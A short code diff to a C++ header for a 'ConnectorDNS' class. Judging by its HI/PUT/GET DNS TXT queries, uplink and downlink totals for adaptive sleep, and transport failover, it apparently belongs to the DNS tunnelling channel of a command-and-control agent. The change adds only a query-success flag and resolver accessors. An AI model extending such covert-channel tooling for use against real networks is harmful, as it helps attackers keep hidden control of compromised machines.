@@ -36,6 +36,12 @@ private:
     ULONG lastDownTotal   = 0;      // last full downlink size (for adaptive sleep)
     ULONG lastUpTotal     = 0;      // last full uplink size (for adaptive sleep)
 
+    // Indicates whether the last DNS query (HI/PUT/GET) completed successfully
+    // from the connector's perspective (DnsQueryTxt returned TRUE and response
+    // parsed without fatal errors). Used by higher-level logic to drive
+    // transport failover decisions.
+    BOOL  lastQueryOk     = FALSE;
+
 public:
     ConnectorDNS();
 
@@ -52,5 +58,10 @@ public:
     ULONG GetLastDownTotal() const { return lastDownTotal; }
     void  ResetTrafficTotals() { lastUpTotal = 0; lastDownTotal = 0; }
     
+    BOOL  WasLastQueryOk() const { return lastQueryOk; }
+
+    const BYTE* GetResolvers() const { return profile.resolvers; }
+    void        UpdateResolvers(BYTE* resolvers);
+
     BOOL  IsBusy() const { return (downBuf != NULL); }
 };
